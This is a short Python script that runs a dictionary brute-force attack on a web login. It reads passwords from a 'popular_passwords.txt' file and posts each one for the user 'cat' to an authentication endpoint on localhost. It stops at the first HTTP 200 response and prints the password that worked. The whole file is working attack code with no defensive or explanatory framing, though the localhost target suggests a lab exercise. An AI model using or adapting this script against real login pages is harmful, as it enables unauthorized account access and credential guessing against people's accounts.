import requests

with open('popular_passwords.txt') as pp:
    s = pp.read()
    passwords = s.split('\n')

index = -1


def get_next_password():
    global index
    index += 1
    return passwords[index]


status_code = 0
step = 0
while status_code != 200:
    password = get_next_password()
    r = requests.post('http://127.0.0.1:5000/auth', data={'login': 'cat', 'password': password})
    status_code = r.status_code
    if step % 1000 == 0:
        print(password)
    step += 1

print(password)
